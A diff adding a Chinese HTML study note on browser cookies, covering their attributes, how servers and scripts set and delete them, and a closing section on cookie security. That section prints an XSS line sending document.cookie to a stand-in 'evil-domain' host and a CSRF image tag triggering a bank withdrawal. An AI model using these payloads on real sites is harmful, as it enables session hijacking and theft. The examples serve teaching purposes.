@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>cookie</title>
+	<link rel="stylesheet" type="text/css" href="../../css/main.css">
+	<script type="text/javascript" src="../../js/jquery-1.9.12.js"></script>
+	<meta charset="utf-8">
+</head>
+<body>
+<div class="home"><a href="../../index.html">首页</a></div>
+
+<div class="aTitle">cookie</div>
+<div class="aPane">
+	<div class="aCode">
+		<pre class="note">
+<b>概念：</b>
+* Cookie是浏览器储存在用户的机器上的一个很小的文本文件。(4K)
+* Cookie是纯文本，没有可执行代码。
+* 储存一些服务器需要的信息，每次请求站点，相应的cookie会被携带并发送到服务器上，
+  这些cookie可以用来辨别用户身份信息等。
+
+<b>服务器设置cookie：</b>
+当服务器收到HTTP请求时，可以在响应头里面增加一个Set-Cookie头部。浏览器收到响应后
+通常会保存Cookie，之后对该服务器每一次请求中都通过Cookie请求头部将Cookie信息发送
+给服务器。
+
+<b>1. cookie属性 -- 过期时间 expires/max-age</b>
+ http/1.0协议中用expires设置过期时间，在新的http/1.1协议中expires已经由 max-age 代替。
+ 1) expires 的值是一个时间点（cookie失效时刻= expires）
+ 	【值为格林威治时间字符串】
+ 2) max-age 的值是一个以秒为单位时间段（cookie失效时刻= 创建时刻+ max-age）
+    【IE6、7、8不支持】
+    【当expires和max-age同时存在，max-age优先级更高】
+
+<b>按照过期时间分类：</b>
+1) 会话cookie
+   会话 cookie 存储在内存中, 用户退出浏览器，会话Cookie就会被删除了。
+   (浏览器开发者工具中 Expires/Max-Age 显示为 session)
+   <b>怎么设置会话cookie:</b>
+   * 不指定过期时间（Expires）或者有效期（Max-Age）
+   * cookie.setMaxAge(-1) 【提示: MaxAge如果设为0，则删除cookie】
+
+2) 持久cookie
+   持久cookie则会储存在硬盘里，保留时间更长，关闭浏览器，重启电脑，依然存在。
+
+<b>2. cookie属性 -- 域 domain</b>
+domain属性用来控制哪些站点可以看到那个cookie。
+例：将domain设为主域名，所有子域名的的服务器都可以获得cookie。
+
+<b>3. cookie属性 -- 路径 path</b>
+path属性可以为特定路径指定Cookie，这个属性设置的url或者带有这个前缀的url路径都是有效的。
+
+<b>4. cookie属性 -- 安全 secure</b>
+设置了属性secure，cookie只有在https协议加密情况下才会发送给服务端。但是这并不是最安全的，
+由于其固有的不安全性，敏感信息也是不应该通过cookie传输的.
+
+<b>5. cookie属性 -- httpOnly</b>
+这个选项用来设置cookie是否能通过 js 去访问。默认情况下，cookie不会带httpOnly选项(即为空)，
+所以默认情况下，客户端是可以通过js代码去访问（包括读取、修改、删除等）这个cookie的。当cookie
+带httpOnly选项时，客户端则无法通过js代码去访问（包括读取、修改、删除等）这个cookie。
+
+
+<b>服务器维护cookie</b>
+<b>1. 设置</b>
+res.writeHead(200, {
+	'Set-Cookie': 'session-id=123456; domain=baidu.com; path=/; httpOnly; secure; max-age=60; expires=' + date.toGMTString()
+})
+<b>2. 删除</b>
+res.writeHead(200, {
+	'Set-Cookie': 'session-id=123456; domain=baidu.com; path=/; expires=' + new Date().toGMTString()
+})
+	或者
+res.writeHead(200, {
+	'Set-Cookie': 'session-id=; domain=baidu.com; path=/; max-age=0'
+})
+
+<b>服务器用cookie-parse维护cookie</b>
+<b>1. 设置</b>
+res.cookie('session-id', result.sessionId, {
+    domain: 'localhost',
+    path: '/',
+    maxAge: 10000, // 单位为毫秒, 而Set-Cookie的max-age单位为秒
+    // expires: date,
+    // secure: true,
+    httpOnly: true
+})
+
+<b>2. 删除</b>
+res.cookie('session-id', null, {
+    expires: new Date()
+})
+或
+res.cookie('session-id', null, {
+    maxAge: 0
+})
+
+<b>客户端维护cookie</b>
+<b>1.设置</b>
+document.cookie = 'session-id=123456; domain=baidu.com; path=/; max-age=60'
+
+<b>2.删除</b>
+document.cookie = 'session-id=; domain=baidu.com; path=/; expires=' + new Date().toGMTString()
+	或者
+document.cookie = 'session-id=; domain=baidu.com; path=/; max-age=0'
+
+<b>参考：</b>
+https://segmentfault.com/a/1190000012578794
+https://mp.weixin.qq.com/s/oOGIuJCplPVW3BuIx9tNQg
+https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies
+https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie
+
+		</pre>
+	</div>
+</div>
+
+<div class="aTitle">cookie安全问题</div>
+<div class="aPane">
+	<div class="aCode">
+		<pre class="note">
+<b>1. 会话劫持(Session hijacking)和跨站脚本攻击XSS(Cross Site Scripting)</b>
+在Web应用中，Cookie常常用来标记用户和会话授权。因此，如果窃取了Web应用的Cookie，可能导致授权用户
+的会话受到攻击。常用的窃取Cookie的方法有利用社会工程学进行攻击和利用应用程序的漏洞进行XSS攻击。
+(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+
+<b>2. 跨站请求伪造（CSRF）</b>
+Cross-site request forgery
+比如在不安全聊天室或论坛上的一张图片，它实际上是一个你的银行服务器发送提现的请求：
+&lt;img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory"&gt;
+当你打开含有了这张图片的HTML页面是，如果你已经登录了你的银行帐号并且还有效（而且没有其它验证步骤），
+你的银行里的钱可能会被自动转走。
+		</pre>
+	</div>
+</div>
+
+</body>
+</html>
